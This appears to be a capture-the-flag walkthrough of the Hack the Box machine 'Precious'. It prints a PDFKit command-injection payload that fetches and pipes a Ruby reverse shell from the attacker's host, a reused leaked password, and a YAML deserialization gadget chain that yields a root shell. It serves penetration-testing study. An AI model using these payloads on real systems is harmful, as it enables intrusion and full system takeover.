Precious is an easy linux machine created by [**Nauten**](https://app.hackthebox.com/users/27582) on [**Hack the Box**](https://app.hackthebox.com/machines/Precious) that features a web server that uses a version of **PDFKit** that is vulnerable to **CVE-2022-25765**, which can be exploited to execute commands as the user _ruby_. Within this user's home directory we find a folder containing a configuration file with the credentials for another user by the name of _henry_. As _henry_, we can run a particular script as root via the `sudo` command. This script is vulnerable to a form of YAML deserialization, which leads us to code execution as _root_.

## Initial Recon

Let's first set up our environment and run a TCP port scan with [this custom nmap wrapper](https://github.com/bryanmcnulty/ctf-scripts/blob/main/recon/active/ctf-portscan.sh).

```bash
# bryan@attacker
rhost="10.10.11.189" # Target IP address
lhost="10.10.14.4" # Your VPN IP address
echo rhost=$rhost >> .env
echo lhost=$lhost >> .env
. ./.env && ctfscan $rhost
```
{:.nolineno}

The open TCP ports reported in the scan include:

| Port | Service | Product | Version                |
|:-----|:--------|:--------|:-----------------------|
| 22   | SSH     | OpenSSH | 8.4p1 Debian 5+deb11u1 |
| 80   | HTTP    | nginx   | 1.18.0                 |

The scan also reports that port 80 responds with a redirection to [http://precious.htb/](http://precious.htb/). Let's add this hostname to our `/etc/hosts`{:.filepath} file.

```bash
# bryan@attacker
echo 'vhost=("precious.htb")' >> .env && . ./.env
echo -e "$rhost\\t$vhost" | sudo tee -a /etc/hosts
```
{:.nolineno}

## Web

We'll begin by visiting [http://precious.htb/](http://precious.htb/) in our favorite browser.

![Home page](homepage.png)
_The main web index_

The page apparently has some functionality that will convert the content at a given URL to a PDF document.

### PDF Generator

Upon sending a dummy URL through the web form, we observe a request from our browser with BurpSuite.

![Convert Request](request.png)

The request just passes the submitted URL to the server. Let's test this functionality on our own HTTP server.

```bash
# bryan@attacker
mkdir share && cd share
echo '<p>Hello!</p>' > index.html
python3 -m http.server --bind $lhost 8080
```
{:.nolineno}
```bash
# bryan@attacker
curl -d "url=http://$lhost:8080/" http://precious.htb/ -o response.bin
```
{:.nolineno}

We get a request to our HTTP server and subsequently receive the PDF result.

```bash
# bryan@attacker
file response.bin # The response body is a PDF document
xdg-open response.bin # Open the document
```
{:.nolineno}

The document contains the text "Hello!", which is expected because that is the content we had on our site earlier. Checking the metadata of the document with `exiftool`, we find out that the _Creator_ field mentions that the document was generated using a product identified as **PDFKit v0.8.6**.

#### CVE-2022-25765

After some research, we determine that this version of _pdfkit_ is vulnerable to CVE-2022-25765, meaning we could potentially inject OS commands as explained [here](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795). Let's try exploiting the bug to establish a reverse shell session with [PwnCat](https://github.com/calebstewart/pwncat). We'll use a reverse shell written in Ruby because we know that Ruby is installed since PDFKit is written in Ruby.

```bash
# bryan@attacker
mkdir -p share && cd share
rb="require 'socket';spawn('sh',[:in,:out,:err]=>TCPSocket.new('$lhost',8443))"
echo "$rb" > index.html # Write ruby reverse shell to web index
python3 -m http.server --bind $lhost 8080 &>/dev/null & # Serve payload
pwncat-cs -m linux -l $lhost 8443 # PwnCat listener | Install: `pip3 install pwncat-cs`
```
{:.nolineno}

```bash
# bryan@attacker
curl precious.htb -d "url=http://%2520%60curl%20$lhost:8080|ruby%60" # Trigger payload
```
{:.nolineno}

Once we trigger the payload, Our PwnCat handler gets a callback and stabilizes the shell.

## Privilege Escalation

### Ruby

Our reverse shell session is in the context of the user _ruby_. In this user's home directory, we find the file `~/.bundle/config`{:.filepath} which contains potential credentials.

```bash
# ruby@precious.htb (PwnCat)
find ~ -type f # We find a configuration file of sorts
cat ~/.bundle/config # Let's read it
```
{:.nolineno}

The user _henry_, associated with the password `Q3c1AqGHtoI0aXAYFH`, is also present on the current machine with the same password.

```bash
# bryan@attacker
pwncat-cs ssh://henry@precious.htb # password is Q3c1AqGHtoI0aXAYFH
```
{:.nolineno}

### Henry

As _henry_, we can execute a specific command as root via `sudo`.

```bash
# henry@precious.htb (SSH)
sudo -l
```
{:.nolineno}
>
```
User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```
{:.nolineno}

Let's take a look at this script and see what it does.

```ruby
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```
{:file="/opt/update_dependencies.rb"}

This script doesn't do much besides calling `YAML.load` on the content of the file `dependencies.yml`{:.filepath} from our working directory. When looking into vulnerabilities affecting `YAML.load`, we discover that it is not safe to use with user supplied data. We also run into [this wonderful post](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/) that describes a gadget chain we could potentially use to execute commands as _root_. We'll modify the command within the YAML payload from the post to spawn an interactive root shell.

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "bash -pi"
         method_id: :resolve
```
{:file="dependencies.yml"}

Now with the YAML payload `dependencies.yml`{:.filepath} in our working directory, we execute the vulnerable script with sudo

```bash
# henry@precious.htb (SSH)
sudo /usr/bin/ruby /opt/update_dependencies.rb # trigger the payload
```
{:.nolineno}

The command successfully spawns a root shell, from which we can read the final flag at `/root/root.txt`{:.filepath}

#### Alternative Solution

Another way we could get the root flag is by using the script at `/opt/update_dependencies.rb`{:.filepath} to read files through a symlink. When the script looks for `dependencies.yml`{:.filepath} in the working directory, it will find a planted symlink that will point to `/root/root.txt`{:.filepath}. When the script tries to parse the file as YAML, it will display an error containing the file contents.

```bash
# henry@precious.htb (SSH)
cd $(mktemp -d)
ln -s /root/root.txt ./dependencies.yml # create symlink
sudo /usr/bin/ruby /opt/update_dependencies.rb # read /root/root.txt
```
